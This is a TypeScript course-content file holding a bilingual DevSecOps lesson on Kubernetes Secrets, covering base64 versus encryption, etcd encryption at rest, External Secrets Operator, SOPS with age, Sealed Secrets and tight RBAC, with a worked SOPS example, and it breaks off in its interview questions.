import type { CourseLesson } from './course-js-module1';

// DevOps Module 19 — DevSecOps: Secrets, Identity & Runtime Hardening (part 2 of 2). L1-3 in course-devops-module19.ts.
// `# VERIFY`:
//   L4 - sops v3.13.3 + age v1.2.1: encrypt a k8s Secret manifest (keys visible, values ENC[AES256_GCM,...]),
//        decrypt roundtrip with the age key, decrypt FAILS ("Failed to get the data key...", exit 128) without it.
//   L5 (workload identity) and L6 (runtime hardening + breach IR) are prose + realistic output.

export const DEVOPS_MODULE_19_PART2: CourseLesson[] = [
  {
    slug: 'ops-secrets-in-kubernetes-external-secrets-sops-and-sealed-secrets',
    title: 'Secrets in Kubernetes: External Secrets, SOPS & Sealed Secrets',
    titleHi: 'Kubernetes Mein Secrets: External Secrets, SOPS Aur Sealed Secrets',
    description:
      'A Kubernetes Secret is not encrypted — it is base64-encoded, which is not the same thing — and by default it sits in etcd in plaintext and is readable by anyone with get on Secrets in the namespace. This lesson covers what a Secret actually is and is not, encryption at rest for etcd, and the three patterns for keeping the real secret out of git while still using Kubernetes Secrets: the External Secrets Operator (pull from a manager), SOPS (encrypt the manifest, decrypt in the pipeline), and Sealed Secrets (encrypt to the cluster\'s public key).',
    descriptionHi:
      'Ek Kubernetes Secret encrypted nahi hai — ye base64-encoded hai, jo ek hi cheez nahi hai — aur by default ye etcd mein plaintext mein baithता hai aur namespace mein Secrets par get wale kisi bhi vyakti dwara readable hai. Ye lesson cover karता hai ki ek Secret actually kya hai aur kya nahi hai, etcd ke liye encryption at rest, aur real secret ko git se bahar rakhne ke teen patterns jabki abhi bhi Kubernetes Secrets use karте hue: External Secrets Operator (ek manager se pull karो), SOPS (manifest encrypt karो, pipeline mein decrypt karो), aur Sealed Secrets (cluster ki public key par encrypt karो).',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 4,

    analogy: {
      en: '**A "PRIVATE" folder that is only labelled private.** A Kubernetes Secret is a folder with "PRIVATE" written on it in a way that everyone in the office can read — base64 is that label, it announces "this is a secret" without stopping anyone from opening it. Encryption at rest for etcd is putting the folder in a locked filing cabinet, which helps if someone steals the cabinet but not if they already work in the office. The three patterns are three ways to keep the actual documents out of the shared drive that syncs to everyone\'s laptop: fetch them from a vault when you sit down (External Secrets), keep them in the drive but scrambled with a key only the office safe holds (Sealed Secrets), or keep them scrambled with a key the courier carries and unscrambles as they hand them over (SOPS).',
      hi: '**Ek "PRIVATE" folder jo sirf private labelled hai.** Ek Kubernetes Secret ek folder hai jispar "PRIVATE" ek aise tarah likha hai jise office mein har koi padh sakта hai — base64 wo label hai, ye "ye ek secret hai" announce karता hai bina kisi ko ise kholने se rोke. Etcd ke liye encryption at rest folder ko ek locked filing cabinet mein daalना hai, jo madad karता hai agar koi cabinet churaता hai par nahi agar wo already office mein kaam karता hai. Teen patterns actual documents ko us shared drive se bahar rakhने ke teen tareeke hain jo har kisi ke laptop par sync hota hai: jab aap baithते ho unhe ek vault se fetch karो (External Secrets), unhe drive mein rakhो par ek key se scrambled jo sirf office safe rakhता hai (Sealed Secrets), ya unhe ek key se scrambled rakhो jo courier carry karता hai (SOPS).',
    },

    simple: `**A KUBERNETES SECRET IS NOT ENCRYPTED — IT IS base64-ENCODED.**
\`\`\`
kind: Secret
data:
  password: czNjcjN0    <-- 'echo czNjcjN0 | base64 -d' -> 's3cr3t'. ANYONE can do this.
base64 is a TRANSPORT ENCODING (it makes binary safe for YAML). it is NOT a
security control. a Secret in a git repo is a plaintext secret in a git repo.
\`\`\`

**WHO CAN READ A SECRET, by default:**
\`\`\`
- anyone with 'get'/'list' on Secrets in that namespace (RBAC - often too broad)
- anyone who can 'exec' into a pod that mounts it, or read the pod's env
- anyone with read access to etcd (or an etcd backup) - Secrets are stored there
  in PLAINTEXT unless you enable encryption at rest
- a node is sent only the Secrets its pods need (good), but a compromised kubelet
  sees those
\`\`\`

**ENCRYPTION AT REST (etcd) — necessary, not sufficient:**
\`\`\`
apiserver --encryption-provider-config: encrypt Secrets before writing to etcd.
  - use a KMS provider (envelope encryption, key in a cloud KMS / HSM), NOT the
    static 'aescbc' key (that key is then... a secret in a file on the master).
  - protects: a stolen etcd backup, disk theft, a direct-etcd-read attacker.
  - does NOT protect: anyone using the k8s API (they see the decrypted value).
managed clusters (EKS/GKE/AKS) offer this as a checkbox (envelope with the cloud KMS).
\`\`\`

**KEEPING THE REAL SECRET OUT OF GIT — three patterns:**
\`\`\`
1. EXTERNAL SECRETS OPERATOR  (pull model)
   git has an 'ExternalSecret' CR: "make a Secret 'api-db' from Vault path X".
   the operator authenticates to Vault/AWS SM/GCP/Azure and SYNCS the value into a
   real k8s Secret, re-syncing on a refresh interval (rotation works).
   -> git contains only the PATH. the value lives in the manager. BEST for most setups.

2. SOPS  (encrypt-the-file model)
   commit 'secret.enc.yaml' where the KEYS are cleartext and the VALUES are
   ENC[AES256_GCM,...]. decrypt in CI / at apply ('sops -d | kubectl apply -f -'),
   or via the SOPS operator / kustomize plugin / Flux's built-in SOPS.
   key held by: age / a cloud KMS / PGP. -> git is safe; the decryptor needs the key.

3. SEALED SECRETS  (encrypt-to-the-cluster model)
   'kubeseal' encrypts your Secret to the CONTROLLER's PUBLIC key -> a 'SealedSecret'
   CR that is safe to commit. only the in-cluster controller (holding the private
   key) can decrypt it, and ONLY into the same namespace+name (prevents lift-and-shift).
   -> no external manager needed. rotation = re-seal. cluster-specific.
\`\`\`

**ALSO: the Secrets Store CSI Driver** mounts secrets from a manager as files
(tmpfs) directly into the pod - no k8s Secret object at all, optional sync-to-Secret.`,

    simpleHi: `**EK KUBERNETES SECRET ENCRYPTED NAHI HAI — YE base64-ENCODED HAI.**
\`\`\`
kind: Secret
data:
  password: czNjcjN0    <-- 'echo czNjcjN0 | base64 -d' -> 's3cr3t'. KOI BHI ye kar sakта hai.
base64 ek TRANSPORT ENCODING hai (ye binary ko YAML ke liye safe banाता hai). ye ek
security control NAHI hai. ek git repo mein ek Secret ek git repo mein ek plaintext secret hai.
\`\`\`

**KAUN EK SECRET PADH SAKTA HAI, by default:**
\`\`\`
- us namespace mein Secrets par 'get'/'list' wala koi bhi (RBAC - aksar too broad)
- koi bhi jo ise mount karne wale ek pod mein 'exec' kar sakта hai, ya pod ka env padh sakта hai
- etcd ke read access wala koi bhi (ya ek etcd backup) - Secrets wahaan PLAINTEXT mein
  store hote hain jab tak aap encryption at rest enable nahi karте
- ek node ko sirf wo Secrets bheje jaते hain jo iske pods ko chahिए (acha), par ek
  compromised kubelet unhe dekhता hai
\`\`\`

**ENCRYPTION AT REST (etcd) — necessary, sufficient nahi:**
\`\`\`
apiserver --encryption-provider-config: etcd mein likhne se pehle Secrets encrypt karो.
  - ek KMS provider use karो (envelope encryption, key ek cloud KMS / HSM mein), NAHI
    static 'aescbc' key (wo key phir... master par ek file mein ek secret hai).
  - protect karता hai: ek stolen etcd backup, disk theft, ek direct-etcd-read attacker.
  - protect NAHI karता: koi bhi jo k8s API use karता hai (wo decrypted value dekhता hai).
managed clusters (EKS/GKE/AKS) ise ek checkbox ke roop mein offer karте hain.
\`\`\`

**REAL SECRET KO GIT SE BAHAR RAKHNA — teen patterns:**
\`\`\`
1. EXTERNAL SECRETS OPERATOR  (pull model)
   git mein ek 'ExternalSecret' CR hai: "Vault path X se ek Secret 'api-db' banaओ".
   operator Vault/AWS SM/GCP/Azure ko authenticate karता hai aur value ko ek real k8s
   Secret mein SYNC karता hai, ek refresh interval par re-syncing (rotation kaam karता hai).
   -> git mein sirf PATH hai. value manager mein rehती hai. zyादातर setups ke liye BEST.

2. SOPS  (encrypt-the-file model)
   'secret.enc.yaml' commit karो jahaan KEYS cleartext hain aur VALUES ENC[AES256_GCM,...] hain.
   CI mein / apply par decrypt karो ('sops -d | kubectl apply -f -'), ya SOPS operator /
   kustomize plugin / Flux ke built-in SOPS ke via.
   key held by: age / ek cloud KMS / PGP. -> git safe hai; decryptor ko key chahिए.

3. SEALED SECRETS  (encrypt-to-the-cluster model)
   'kubeseal' aapke Secret ko CONTROLLER ki PUBLIC key par encrypt karता hai -> ek
   'SealedSecret' CR jo commit karne ke liye safe hai. sirf in-cluster controller
   (private key holding) ise decrypt kar sakта hai, aur SIRF same namespace+name mein.
   -> koi external manager nahi chahिए. rotation = re-seal. cluster-specific.
\`\`\`

**ALSO: Secrets Store CSI Driver** ek manager se secrets ko files (tmpfs) ke roop
mein directly pod mein mount karता hai - koi k8s Secret object hi nahi.`,

    content: `## A Secret is not encrypted

The single most important fact about a Kubernetes Secret is that it is not encrypted. The values are base64-encoded, and base64 is a transport encoding whose only purpose is to make arbitrary binary data safe to embed in YAML — anyone can decode it with one command. A Secret manifest committed to a git repository is a plaintext secret committed to a git repository, with all the permanence and exposure that Module 18 Lesson 3 covers. The \`Secret\` type conveys intent to Kubernetes — it is mounted differently, is not shown in some outputs, and can be RBAC-controlled separately from ConfigMaps — but it provides no confidentiality on its own.

## Who can read a Secret

By default a Secret is readable by several parties. Anyone with \`get\` or \`list\` on Secrets in the namespace can read every Secret in it through the API, and RBAC roles are frequently written more broadly than that access warrants. Anyone who can \`exec\` into a pod that mounts the Secret, or who can read that pod\'s environment, sees the value. Anyone with read access to etcd, or to an etcd backup, sees the Secret — because unless encryption at rest is configured, Secrets are stored in etcd in plaintext. The kubelet on a node receives only the Secrets that node\'s pods require, which limits exposure, but a compromised kubelet sees those.

## Encryption at rest

You enable encryption at rest by giving the API server an encryption provider configuration, so that it encrypts Secret data before writing it to etcd and decrypts on read. The important choice is the provider: a KMS provider performs envelope encryption with the data-encryption key wrapped by a key held in a cloud KMS or an HSM, which is the right design; the static \`aescbc\` provider uses a key written in a file on the control plane, which is itself now a secret sitting in plaintext on the master and only marginally better than nothing. Encryption at rest protects against a stolen etcd backup, physical disk theft, and an attacker reading etcd directly. It does not protect against anyone using the Kubernetes API, who receives the decrypted value as normal. Managed control planes — EKS, GKE, AKS — offer envelope encryption with the cloud KMS as a configuration option, and it should be on.

## External Secrets Operator

The first pattern for keeping the real secret out of git is a pull model. You commit an \`ExternalSecret\` custom resource that names a secrets manager, a path in it, and the Kubernetes Secret to produce. The External Secrets Operator, running in the cluster, authenticates to Vault, AWS Secrets Manager, GCP Secret Manager, or Azure Key Vault using a workload identity, reads the value, and materialises it into a normal Kubernetes Secret that pods consume in the usual way. It re-syncs on a refresh interval, so when the value is rotated in the manager the Kubernetes Secret updates automatically. Git contains only the reference — the manager name and the path — which is not sensitive. This is the best fit for most organisations because it centralises the actual secrets in a manager with policies, audit, and rotation, while pods keep using plain Secret mounts.

## SOPS

The second pattern encrypts the manifest itself. SOPS — Secrets OPerationS — takes a YAML or JSON file and encrypts the values while leaving the keys and structure in cleartext, so a committed \`secret.enc.yaml\` shows that there is a Secret named \`db-creds\` with keys \`username\` and \`password\`, but each value is an \`ENC[AES256_GCM,...]\` string. The data-encryption key is itself encrypted to one or more recipients — an age key, a cloud KMS key, a PGP key — and stored in the file\'s \`sops\` metadata. Decryption happens in the pipeline: \`sops --decrypt secret.enc.yaml | kubectl apply -f -\`, or through a SOPS-aware operator, a Kustomize plugin, or Flux\'s built-in SOPS support that decrypts at apply time. Git is safe to expose; only a holder of the recipient key can decrypt. The trade-off is that the decryption key has to be available wherever the apply happens.

## Sealed Secrets

The third pattern encrypts to the cluster. The Sealed Secrets controller runs in the cluster and holds a private key; it publishes the corresponding public key. The \`kubeseal\` CLI takes an ordinary Secret and encrypts it to that public key, producing a \`SealedSecret\` custom resource that is safe to commit because only the in-cluster controller can decrypt it. Crucially the encryption is bound to the target namespace and name, so a \`SealedSecret\` cannot be copied to a different namespace or renamed and still decrypt — this prevents an attacker who obtains the committed file from applying it somewhere they control. There is no external secrets manager to run, which suits smaller setups; the cost is that sealed values are specific to one cluster\'s key, rotation means re-sealing, and there is no central audit or cross-cluster story.

## The Secrets Store CSI Driver

An alternative to all three is the Secrets Store CSI Driver, which mounts secrets from a manager directly into a pod as files on a tmpfs volume, with no Kubernetes Secret object involved at all unless you opt into an optional sync. The pod reads a file; the value never becomes an API object. This is the tightest option for avoiding Secret exposure through the API, at the cost of the application needing to read a file rather than an environment variable.`,

    contentHi: `## Ek Secret encrypted nahi hai

Ek Kubernetes Secret ke baare mein single sabse important fact ye hai ki ye encrypted nahi hai. Values base64-encoded hain, aur base64 ek transport encoding hai jिska ekmatra purpose arbitrary binary data ko YAML mein embed karne ke liye safe banaना hai — koi bhi ise ek command se decode kar sakta hai. Ek git repository mein committed ek Secret manifest ek git repository mein committed ek plaintext secret hai. \`Secret\` type Kubernetes ko intent convey karता hai par ye apne aap koi confidentiality provide nahi karता.

## Kaun ek Secret padh sakta hai

By default ek Secret kई parties dwara readable hai. Namespace mein Secrets par \`get\` ya \`list\` wala koi bhi API ke through isme har Secret padh sakta hai, aur RBAC roles aksar us access se zyada broadly likhe jaте hain jitni warrant hoती hai. Koi bhi jo ise mount karne wale ek pod mein \`exec\` kar sakta hai value dekhता hai. Etcd ke read access wala koi bhi Secret dekhता hai — kyunki jab tak encryption at rest configured nahi hai, Secrets etcd mein plaintext mein store hote hain.

## Encryption at rest

Aap encryption at rest enable karте ho API server ko ek encryption provider configuration dekar, taaki ye Secret data ko etcd mein likhne se pehle encrypt karता hai. Important choice provider hai: ek KMS provider envelope encryption perform karता hai data-encryption key ke saath jo ek cloud KMS ya ek HSM mein rakhी key dwara wrapped hai; static \`aescbc\` provider ek key use karता hai jo control plane par ek file mein likhी hai. Encryption at rest ek stolen etcd backup, physical disk theft, aur ek attacker jo etcd directly padhता hai ke against protect karता hai. Ye Kubernetes API use karne wale kisi bhi vyakti ke against protect nahi karता.

## External Secrets Operator

Real secret ko git se bahar rakhने ka pehla pattern ek pull model hai. Aap ek \`ExternalSecret\` custom resource commit karте ho jo ek secrets manager, isme ek path, aur produce karने ke liye Kubernetes Secret name karता hai. External Secrets Operator, cluster mein running, Vault, AWS Secrets Manager, GCP Secret Manager, ya Azure Key Vault ko ek workload identity use karके authenticate karता hai, value padhता hai, aur ise ek normal Kubernetes Secret mein materialise karता hai. Ye ek refresh interval par re-sync karता hai. Git mein sirf reference hai.

## SOPS

Doosra pattern manifest khud encrypt karता hai. SOPS ek YAML ya JSON file leता hai aur values encrypt karता hai jabki keys aur structure ko cleartext mein chhodता hai, to ek committed \`secret.enc.yaml\` dikhाता hai ki \`db-creds\` naam ka ek Secret hai keys \`username\` aur \`password\` ke saath, par har value ek \`ENC[AES256_GCM,...]\` string hai. Data-encryption key khud ek ya zyada recipients par encrypted hai. Decryption pipeline mein hoती hai: \`sops --decrypt secret.enc.yaml | kubectl apply -f -\`. Git expose karne ke liye safe hai.

## Sealed Secrets

Teesra pattern cluster par encrypt karता hai. Sealed Secrets controller cluster mein run karता hai aur ek private key rakhता hai; ye corresponding public key publish karता hai. \`kubeseal\` CLI ek ordinary Secret leता hai aur ise us public key par encrypt karता hai, ek \`SealedSecret\` custom resource produce karता hai jo commit karne ke liye safe hai. Crucially encryption target namespace aur name se bound hai, to ek \`SealedSecret\` ek alag namespace mein copy nahi kiya ja sakता aur abhi bhi decrypt ho. Koi external secrets manager nahi chahिए jo run karna hai.

## Secrets Store CSI Driver

In teenon ka ek alternative Secrets Store CSI Driver hai, jo ek manager se secrets ko directly ek pod mein ek tmpfs volume par files ke roop mein mount karता hai, koi Kubernetes Secret object involved nahi. Pod ek file padhता hai; value kabhi ek API object nahi banता.`,

    examples: [
      {
        title: 'SOPS + age: encrypt a Secret manifest so git is safe, decrypt only with the key',
        titleHi: 'SOPS + age: ek Secret manifest encrypt karo taaki git safe ho, sirf key ke saath decrypt karo',
        code: `# VERIFY
age-keygen -o age.key 2> keygen.err
PUB=\$(grep -oE 'age1[a-z0-9]+' keygen.err)
export SOPS_AGE_KEY_FILE=age.key      # relative - a native tool can't open an MSYS \$PWD path

cat > db-secret.yaml <<'YAML'
apiVersion: v1
kind: Secret
metadata:
  name: db-creds
  namespace: prod
type: Opaque
stringData:
  username: appuser
  password: S3cr3tP@ss
  DATABASE_URL: postgres://appuser:S3cr3tP@ss@db:5432/app
YAML

# encrypt only the values under data/stringData; keys + structure stay cleartext
sops encrypt --age "\$PUB" --encrypted-regex '^(data|stringData)\$' db-secret.yaml > db-secret.enc.yaml

echo "--- db-secret.enc.yaml (this is what you commit to git): ---"
grep -E '^kind:|^type:|^    name:|^    namespace:' db-secret.enc.yaml
echo "  value lines that are now ciphertext:"
grep -cE '^    (username|password|DATABASE_URL): ENC\\[' db-secret.enc.yaml | sed 's/^/    /'
echo "  occurrences of the plaintext password 'S3cr3tP@ss': \$(grep -c 'S3cr3tP@ss' db-secret.enc.yaml)"

echo "--- CI / the cluster decrypts at apply time (has the age key): ---"
sops decrypt db-secret.enc.yaml | grep -E 'username:|password:|DATABASE_URL:'

echo "--- someone WITHOUT the key cannot read it: ---"
SOPS_AGE_KEY_FILE=nope.key sops decrypt db-secret.enc.yaml > /dev/null 2> err.txt
echo "exit \$?"; head -1 err.txt`,
        output: `--- db-secret.enc.yaml (this is what you commit to git): ---
kind: Secret
    name: db-creds
    namespace: prod
type: Opaque
  value lines that are now ciphertext:
    3
  occurrences of the plaintext password 'S3cr3tP@ss': 0
--- CI / the cluster decrypts at apply time (has the age key): ---
    username: appuser
    password: S3cr3tP@ss
    DATABASE_URL: postgres://appuser:S3cr3tP@ss@db:5432/app
--- someone WITHOUT the key cannot read it: ---
exit 128
Failed to get the data key required to decrypt the SOPS file.`,
        explain: 'SOPS makes a secret manifest safe to keep in git. An age keypair is generated — \`age.key\` is the private key, the \`age1...\` string is the public recipient. The plaintext \`db-secret.yaml\` has three real credential values under \`stringData\`. \`sops encrypt\` with \`--encrypted-regex\` targeting \`data\` and \`stringData\` produces \`db-secret.enc.yaml\`, in which the \`kind\`, \`type\`, \`metadata.name\`, \`metadata.namespace\`, and the keys \`username\`/\`password\`/\`DATABASE_URL\` are all still cleartext — so a reviewer can see the shape of the change and diff it meaningfully — but each value is now an \`ENC[AES256_GCM,...]\` string, and the plaintext password appears zero times in the file. That file is what gets committed. Decryption requires the age private key: with \`SOPS_AGE_KEY_FILE\` pointing at it, \`sops decrypt\` reproduces the original values, which is what the CI pipeline or a Flux/Kustomize SOPS integration does at apply time. Pointed at a key that does not exist, \`sops decrypt\` fails with exit 128 and "Failed to get the data key" — so the committed file is inert to anyone without the recipient key. The data-encryption key is stored in the file\'s \`sops\` metadata, itself encrypted to the age recipient; in production that recipient is typically a cloud KMS key so decryption is access-controlled and audited rather than gated by a file.',
        explainHi: 'SOPS ek secret manifest ko git mein rakhne ke liye safe banaता hai. Ek age keypair generate hoती hai — \`age.key\` private key hai, \`age1...\` string public recipient hai. Plaintext \`db-secret.yaml\` mein \`stringData\` ke under teen real credential values hain. \`sops encrypt\` \`--encrypted-regex\` ke saath \`db-secret.enc.yaml\` produce karता hai, jismein \`kind\`, \`type\`, \`metadata.name\`, aur keys \`username\`/\`password\`/\`DATABASE_URL\` sab abhi bhi cleartext hain — to ek reviewer change ka shape dekh sakта hai — par har value ab ek \`ENC[AES256_GCM,...]\` string hai, aur plaintext password file mein zero baar appear hoता hai. Wo file wo hai jो commit hoती hai. Decryption ko age private key chahिए. Ek key par pointed jo exist nahi karता, \`sops decrypt\` exit 128 ke saath fail hoता hai. Production mein wo recipient typically ek cloud KMS key hoता hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# "we base64-encoded the secret, so it's fine to commit"
  # secret.yaml, committed to the app repo:
  apiVersion: v1
  kind: Secret
  metadata: { name: api-db }
  data:
    password: c3VwZXJzZWNyZXQ=          # <-- "it's encoded!"  (base64 of 'supersecret')
    stripe_key: PGxpdmUta2V5LWhlcmU+   # <-- base64 of '<live-key-here>'
  # anyone who can read the repo runs:  echo c3VwZXJzZWNyZXQ= | base64 -d
  #   -> supersecret
  # base64 is not encryption. this is a plaintext secret in git, in history
  # forever, in every clone and CI cache, scraped in seconds if the repo is public.`,
        right: `# commit a REFERENCE, not the secret. External Secrets Operator (pull from a manager):
  apiVersion: external-secrets.io/v1
  kind: ExternalSecret
  metadata: { name: api-db, namespace: prod }
  spec:
    refreshInterval: 1h
    secretStoreRef: { name: vault-prod, kind: ClusterSecretStore }
    target: { name: api-db }              # the k8s Secret the operator will create
    data:
      - secretKey: password
        remoteRef: { key: secret/data/prod/api, property: db_password }
      - secretKey: stripe_key
        remoteRef: { key: secret/data/prod/api, property: stripe_key }
  # git contains: the Vault PATH 'secret/data/prod/api' and the property names.
  # NOT sensitive. the operator (authing to Vault with a workload identity) syncs
  # the real values into the Secret 'api-db', re-syncing hourly so rotation lands.
  # OR: SOPS (commit secret.enc.yaml with ENC[...] values, decrypt in CI/Flux).
  # OR: Sealed Secrets (kubeseal to the cluster's public key -> SealedSecret CR).`,
        why: 'The belief that base64 encoding makes a secret safe to commit is one of the most common and most damaging misconceptions in Kubernetes. Base64 is a reversible encoding with no key — its purpose is to represent binary data in text, and \`base64 -d\` is a single command anyone can run. A Secret manifest with base64 \`data\` in a git repository is a plaintext secret in a git repository, with the full permanence problem: it is in history forever, in every clone and fork, in CI caches, and if the repository is or becomes public it is scraped within seconds. The fix is to never put the value in git at all. With the External Secrets Operator you commit an \`ExternalSecret\` that references a path in a secrets manager; the operator authenticates to the manager with a workload identity and syncs the real value into a Kubernetes Secret at runtime, re-syncing periodically so rotations propagate, and git holds only the non-sensitive path. SOPS and Sealed Secrets are alternatives that keep an encrypted form in git — SOPS encrypts the values to a KMS or age key and decrypts in the pipeline, Sealed Secrets encrypts to the cluster controller\'s public key — but in all three cases the plaintext secret never enters version control.',
        whyHi: 'Ye belief ki base64 encoding ek secret ko commit karne ke liye safe banaता hai Kubernetes mein sabse common aur sabse damaging misconceptions mein se ek hai. Base64 ek reversible encoding hai bina key ke — iska purpose binary data ko text mein represent karna hai, aur \`base64 -d\` ek single command hai jise koi bhi run kar sakta hai. Ek git repository mein base64 \`data\` wala ek Secret manifest ek git repository mein ek plaintext secret hai, full permanence problem ke saath. Fix value ko git mein daalना hi nahi hai. External Secrets Operator ke saath aap ek \`ExternalSecret\` commit karте ho jo ek secrets manager mein ek path reference karता hai; operator manager ko ek workload identity se authenticate karता hai aur real value ko ek Kubernetes Secret mein sync karता hai. SOPS aur Sealed Secrets alternatives hain jो git mein ek encrypted form rakhते hain.',
      },
      {
        wrong: `# encryption at rest enabled, but with a static local key on the control plane
  # /etc/kubernetes/encryption-config.yaml:
  resources:
    - resources: ["secrets"]
      providers:
        - aescbc:
            keys:
              - name: key1
                secret: c2VjcmV0LXN0YXRpYy1rZXktbmV2ZXItcm90YXRlZA==   # <-- a static key,
        - identity: {}                                                #     in a file, on the master
  # this file IS the key. it sits in plaintext on every control-plane node, gets
  # backed up with them, and is never rotated (rotation needs a rolling re-encrypt).
  # a compromised master node -> the attacker has both etcd AND the key.
  # AND 'identity' is listed as a fallback -> new secrets may be written unencrypted
  # if the order is wrong.`,
        right: `# KMS provider: envelope encryption, root key in a cloud KMS / HSM
  resources:
    - resources: ["secrets"]
      providers:
        - kms:
            apiVersion: v2
            name: cloud-kms
            endpoint: unix:///var/run/kmsplugin/socket.sock
        - identity: {}       # fallback LAST, and only for reads of old data
  # the data-encryption key is generated per-write and stored (encrypted) alongside
  # the secret in etcd; it is unwrappable only by the root key in the cloud KMS,
  # which never leaves the KMS/HSM, is access-controlled, audited, and rotatable
  # independently. a stolen etcd backup is useless without KMS access.
  # on EKS/GKE/AKS this is a one-line cluster setting (envelope encryption w/ the cloud KMS).`,
        why: 'Enabling encryption at rest with the static \`aescbc\` provider improves on nothing meaningfully, because the encryption key is now a value written in plaintext in a file on every control-plane node. That file is included in control-plane backups, is readable by anyone who compromises a master, and is not rotated because rotating it requires a coordinated re-encryption of all existing Secrets. An attacker who reaches a control-plane node therefore obtains both the etcd data and the key to decrypt it, which is the exact scenario encryption at rest is supposed to defend against. The KMS provider fixes this with envelope encryption: a fresh data-encryption key is generated for each write and stored encrypted next to the Secret in etcd, and that key can only be unwrapped by a root key that lives in a cloud KMS or HSM, never leaves it, is access-controlled and audited, and is rotated on its own schedule. A stolen etcd backup is then just ciphertext plus wrapped keys, useless without the ability to call the KMS. On managed control planes this is a single cluster setting. The \`identity\` provider must be listed last and understood as a read-only fallback for data written before encryption was enabled, never first.',
        whyHi: 'Static \`aescbc\` provider ke saath encryption at rest enable karna kुछ bhi meaningfully improve nahi karता, kyunki encryption key ab ek value hai jो har control-plane node par ek file mein plaintext mein likhी hai. Wo file control-plane backups mein included hai, ek master ko compromise karne wale kisi bhi vyakti dwara readable hai, aur rotate nahi hoती. Ek attacker jो ek control-plane node tak pahunचता hai isliye etcd data aur ise decrypt karne ki key dono obtain karता hai. KMS provider ise envelope encryption se fix karता hai: har write ke liye ek fresh data-encryption key generate hoती hai aur etcd mein Secret ke bगल mein encrypted store hoती hai, aur wo key sirf ek root key dwara unwrap ho sakती hai jो ek cloud KMS ya HSM mein rehती hai. Managed control planes par ye ek single cluster setting hai.',
      },
      {
        wrong: `# a Role that grants 'get' on ALL secrets in the namespace, to a broad group
  kind: Role
  metadata: { namespace: prod, name: dev-access }
  rules:
    - apiGroups: [""]
      resources: ["secrets"]           # <-- ALL secrets
      verbs: ["get", "list", "watch"]  # <-- list = dump every secret's contents
  # bound to the 'developers' group (20 people). now all 20 can run:
  #   kubectl get secret -n prod -o yaml
  # -> the prod DB password, the Stripe key, the JWT signing secret, TLS private
  #    keys - every credential in the namespace, in plaintext (base64), on 20 laptops.
  # and a compromised dev laptop = the whole namespace's secrets.`,
        right: `# no standing human 'get secrets'; scope service accounts to the exact secret
  # 1. humans: NO 'get'/'list' on secrets in prod. break-glass only, audited,
  #    time-boxed (e.g. via a PAM tool that grants a 1h role and logs it).
  # 2. each workload's ServiceAccount gets read on ONLY its own secret:
  kind: Role
  metadata: { namespace: prod, name: api-secret-read }
  rules:
    - apiGroups: [""]
      resources: ["secrets"]
      resourceNames: ["api-db"]          # <-- THIS secret only
      verbs: ["get"]                     # <-- not list (list ignores resourceNames)
  # 3. prefer mounts over the API: the pod gets the secret as a file/env via the
  #    kubelet; it never needs 'get secrets' itself.
  # 4. audit: alert on any 'list secrets' in prod that isn't the known operator SA.`,
        why: 'A Role that grants \`get\`, \`list\`, and \`watch\` on all Secrets in a namespace, bound to a broad group, means every member of that group can retrieve the plaintext contents of every credential in the namespace with one command. \`list\` is especially dangerous because it returns full object contents and ignores \`resourceNames\` restrictions, so "list secrets" is "dump all secrets". Bound to twenty developers, that is twenty copies of the production database password, the payment key, the token-signing secret, and any TLS private keys, sitting on twenty laptops, any one of which being compromised exposes the entire namespace. The correct posture is that humans have no standing read access to Secrets in production at all — access is break-glass, granted for a bounded time through an audited process. Workloads get read access to only their own Secret, specified by \`resourceNames\` with the \`get\` verb only, never \`list\`. And where possible the pod does not use the API to read Secrets at all: the kubelet mounts the Secret as a file or environment variable, so the pod\'s ServiceAccount needs no Secret permissions. Finally, an alert on any \`list secrets\` call in production that is not the known operator ServiceAccount catches both misconfiguration and active abuse.',
        whyHi: 'Ek Role jо ek namespace mein saare Secrets par \`get\`, \`list\`, aur \`watch\` grant karता hai, ek broad group se bound, ka matlab us group ka har member ek command se namespace mein har credential ki plaintext contents retrieve kar sakता hai. \`list\` especially dangerous hai kyunki ye full object contents return karता hai aur \`resourceNames\` restrictions ignore karता hai. Bees developers se bound, wo bees copies production database password, payment key, aur token-signing secret ki hain, bees laptops par baithी. Correct posture ye hai ki humans ke paas production mein Secrets par koi standing read access nahi hai — access break-glass hai. Workloads ko sirf apne Secret par read access milता hai, \`resourceNames\` se specified \`get\` verb ke saath, kabhi \`list\` nahi. Aur jahaan possible pod Secrets padhने ke liye API use nahi karता.',
      },
    ],

    realWorld: [
      {
        en: '**base64-in-git as the default mistake** — public GitHub is full of `kind: Secret` manifests with real base64 values, and Kubernetes\' own docs have a prominent warning that base64 is not encryption. Nearly every "we leaked a secret" k8s postmortem starts with a Secret manifest committed as-is.',
        hi: '**base64-in-git default mistake ke roop mein** — public GitHub real base64 values wale `kind: Secret` manifests se bhara hua hai, aur Kubernetes ke apne docs mein ek prominent warning hai ki base64 encryption nahi hai. Lगभग har "humne ek secret leak kiya" k8s postmortem ek Secret manifest se shuru hota hai jо as-is committed hai.',
      },
      {
        en: '**External Secrets Operator adoption** — ESO became the de facto standard for GitOps + secrets: the git repo holds only `ExternalSecret` CRs pointing at Vault / AWS SM / GCP SM / Azure KV, the operator syncs, and rotation in the manager propagates to the cluster on the refresh interval. Flux and Argo CD both document it as the recommended pattern.',
        hi: '**External Secrets Operator adoption** — ESO GitOps + secrets ke liye de facto standard ban gaya: git repo sirf `ExternalSecret` CRs rakhता hai jо Vault / AWS SM / GCP SM / Azure KV par point karते hain, operator sync karता hai, aur manager mein rotation refresh interval par cluster mein propagate hoती hai.',
      },
      {
        en: '**Bitnami Sealed Secrets for small teams** — teams without a secrets manager widely use Sealed Secrets: `kubeseal` the Secret to the cluster\'s public key, commit the `SealedSecret`, and the in-cluster controller decrypts. The namespace+name binding has prevented real "someone applied the committed secret to their own cluster" attempts.',
        hi: '**Small teams ke liye Bitnami Sealed Secrets** — jinke paas ek secrets manager nahi hai wo widely Sealed Secrets use karते hain: Secret ko cluster ki public key par `kubeseal` karो, `SealedSecret` commit karो, aur in-cluster controller decrypt karता hai. Namespace+name binding ne real "kisi ne committed secret ko apne cluster par apply kiya" attempts prevent kiye hain.',
      },
    ],

    interviewQA: [
      {
        q: 'Is a Kubernetes Secret encrypted? Who can read one by default, and what does enabling encryption at rest actually protect against?',
        qHi: 'Kya ek Kubernetes Secret encrypted hai? By default kaun ek padh sakта hai, aur encryption at rest enable karna actually kis ke against protect karता hai?',
